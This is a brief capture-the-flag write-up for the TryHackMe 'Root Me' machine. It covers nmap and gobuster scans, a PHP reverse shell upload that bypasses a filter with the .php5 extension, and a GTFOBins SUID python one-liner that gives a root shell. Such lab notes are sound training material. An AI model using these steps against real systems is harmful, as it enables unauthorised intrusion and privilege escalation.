# Root Me

Plataforma: TryHackMe
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 4 de diciembre de 2024 21:30
IP: 10.10.10.6

```bash
nmap: nmap :  map -p- -sS -sV -sC --min-rate 5000 -n -Pn 10.10.10.6 -oN namp
```

```bash
gobuster: gobuster dir -u IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Reverse shell PHP : pentestmonkey (bypass php amb php5)

```bash
cat /var/www-data/user.txt
```

Escalada:

```bash
sudo -l
suid : /usr/bin/python
```

GTFObins: 

```bash
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```bash
cat /root/root.txt
```